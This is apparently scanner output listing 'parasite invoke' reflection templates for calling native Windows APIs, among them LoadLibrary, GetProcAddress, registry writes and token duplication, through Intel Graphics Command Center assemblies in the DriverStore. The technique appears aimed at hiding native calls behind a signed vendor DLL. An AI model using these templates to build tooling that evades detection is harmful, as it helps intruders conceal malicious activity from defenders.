        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTQueryAdapterInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus) methodInfo.Invoke(null, new object[] { D3DKMT_QUERYADAPTERINFO& deviceArg });
        ===END SIGNATURE===

Method: LoadLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LoadLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string path });
        ===END SIGNATURE===

Method: GetProcAddress
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetProcAddress"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hModule, string procName });
        ===END SIGNATURE===

Method: FreeLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""FreeLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hModule });
        ===END SIGNATURE===

Method: LoadPackagedLibrary
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""LoadPackagedLibrary"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string libFileName, uint Reserved });
        ===END SIGNATURE===

Method: SetDeviceGammaRamp
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetDeviceGammaRamp"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDC, RAMP& lpRamp });
        ===END SIGNATURE===

Method: GetDeviceGammaRamp
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDeviceGammaRamp"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDC, RAMP& lpRamp });
        ===END SIGNATURE===

Method: GetDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hWnd });
        ===END SIGNATURE===

Method: ReleaseDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ReleaseDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, IntPtr hDC });
        ===END SIGNATURE===

Method: RegisterHotKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterHotKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int id, int fsModifiers, Keys vk });
        ===END SIGNATURE===

Method: UnregisterHotKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""UnregisterHotKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int id });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: SendMessage
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SendMessage"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam });
        ===END SIGNATURE===

Method: RegisterWindowMessage
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterWindowMessage"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { string lpString });
        ===END SIGNATURE===

Method: RegCloseKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCloseKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey });
        ===END SIGNATURE===

Method: RegQueryValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegQueryValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int lpReserved, Int32& type, IntPtr lpData, Int32& lpcbData });
        ===END SIGNATURE===

Method: RegQueryValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegQueryValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int lpReserved, Int32& type, StringBuilder lpData, Int32& lpcbData });
        ===END SIGNATURE===

Method: RegOpenKeyEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegOpenKeyEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string subKey, int ulOptions, uint samDesired, IntPtr& hkResult });
        ===END SIGNATURE===

Method: RegSetValueEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegSetValueEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpValueName, int Reserved, RegistryValueKind dwType, IntPtr lpData, int cbData });
        ===END SIGNATURE===

Method: RegCreateKeyA
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCreateKeyA"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { uint hKey, string lpSubKey, IntPtr phkResult });
        ===END SIGNATURE===

Method: RegCreateKeyEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegCreateKeyEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hKey, string lpSubKey, int Reserved, string lpClass, RegOption dwOptions, RegSAM samDesired, IntPtr lpSecurityAttributes, IntPtr& phkResult, RegResult& lpdwDisposition });
        ===END SIGNATURE===

Method: RegisterDeviceNotification
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterDeviceNotification"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hRecipient, IntPtr NotificationFilter, uint Flags });
        ===END SIGNATURE===

Method: PowerSetActiveScheme
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerSetActiveScheme"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr UserPowerKey, Guid& ActivePolicyGuid });
        ===END SIGNATURE===

Method: PowerGetActiveScheme
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerGetActiveScheme"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr UserPowerKey, IntPtr& ActivePolicyGuid });
        ===END SIGNATURE===

Method: PowerReadFriendlyName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadFriendlyName"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr RootPowerKey, Guid& SchemeGuid, IntPtr SubGroupOfPowerSettingsGuid, IntPtr PowerSettingGuid, IntPtr Buffer, UInt32& BufferSize });
        ===END SIGNATURE===

Method: PowerReadDCValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadDCValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, UInt32& DcValueIndex });
        ===END SIGNATURE===

Method: PowerWriteDCValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerWriteDCValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, uint DcValueIndex });
        ===END SIGNATURE===

Method: PowerReadACValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerReadACValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, UInt32& DcValueIndex });
        ===END SIGNATURE===

Method: PowerWriteACValueIndex
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""PowerWriteACValueIndex"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr handle, Guid& SchemeGuid, Guid& subGroupOfGfxSettingsGuid, Guid& GfxSettingGuid, uint DcValueIndex });
        ===END SIGNATURE===

Method: RegisterPowerSettingNotification
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""RegisterPowerSettingNotification"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hRecipient, Guid& PowerSettingGuid, int Flags });
        ===END SIGNATURE===

Method: GetSystemPowerStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetSystemPowerStatus"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { SYSTEM_POWER_STATUS& systemPowerStatus });
        ===END SIGNATURE===

Method: clGetPlatformIDs
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""clGetPlatformIDs"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { uint numEntries, PlatformID[] platforms, UInt32& numPlatforms });
        ===END SIGNATURE===

Method: clGetPlatformInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""clGetPlatformInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { PlatformID platform, PlatformInfo param_name, IntPtr param_value_size, Byte[] param_value, IntPtr& param_value_size_ret });
        ===END SIGNATURE===

Method: CreateDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateDC"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpszDriver, string lpszDevice, string lpszOutput, IntPtr lpInitData });
        ===END SIGNATURE===

Method: clGetPlatformInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""clGetPlatformInfo"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode result = (OneApp.IGCC.CoreLibrary.SystemInformation.Model.OpenCLData/ErrorCode) methodInfo.Invoke(null, new object[] { PlatformID platform, PlatformInfo param_name, IntPtr param_value_size, IntPtr param_value, IntPtr& param_value_size_ret });
        ===END SIGNATURE===

Method: ChoosePixelFormat
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChoosePixelFormat"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr hdc, PixelFormatDescriptor& pfd });
        ===END SIGNATURE===

Method: SetPixelFormat
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetPixelFormat"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc, int iPixelFormat, PixelFormatDescriptor& pfd });
        ===END SIGNATURE===

Method: wglCreateContext
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""wglCreateContext"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hdc });
        ===END SIGNATURE===

Method: wglMakeCurrent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""wglMakeCurrent"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc, IntPtr hglrc });
        ===END SIGNATURE===

Method: wglDeleteContext
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""wglDeleteContext"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hglrc });
        ===END SIGNATURE===

Method: glGetString
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""glGetString"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { GLStringNames name });
        ===END SIGNATURE===

Method: OpenProcessToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""OpenProcessToken"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { IntPtr ProcessHandle, int DesiredAccess, IntPtr& TokenHandle });
        ===END SIGNATURE===

Method: CloseHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""CloseHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr handle });
        ===END SIGNATURE===

Method: DuplicateToken
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.D3D.DXDB.WindowsIdentityManager"", true);
        var methodInfo = t.GetMethod(""DuplicateToken"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, IntPtr& DuplicateTokenHandle });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\IntelGraphicsAGS.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.SDKCommandLine.exe
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.WinService.exe

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.WinService.exe"");
        Type t = asm.GetType(""OneApp.IGCC.WinService.igccservice"", true);
